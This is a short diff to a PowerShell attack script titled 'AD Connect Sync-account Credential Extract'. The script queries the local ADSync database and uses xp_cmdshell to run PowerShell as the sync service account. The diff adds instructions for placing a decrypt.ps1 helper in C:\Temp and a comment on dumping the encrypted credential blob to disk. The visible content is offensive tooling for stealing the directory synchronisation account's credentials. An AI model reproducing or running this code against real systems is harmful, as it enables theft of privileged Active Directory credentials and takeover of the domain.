@@ -1,4 +1,5 @@
 Write-Host "AD Connect Sync-account Credential Extract"
+Write-Host "Place decrypt.ps1 at C:\Temp\decrypt.ps1 in order for this script to work"
 
 $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
 
@@ -40,6 +41,7 @@ $reader.Close()
 
 Write-Host "[*] Using xp_cmdshell to run some Powershell as the service user"
 
+#dump crypted text to disk as we cannot pass it in the powershell command as it is too long
 $crypted | Out-File -FilePath "C:\Temp\crypted.txt"
 
 $cmd = $client.CreateCommand()
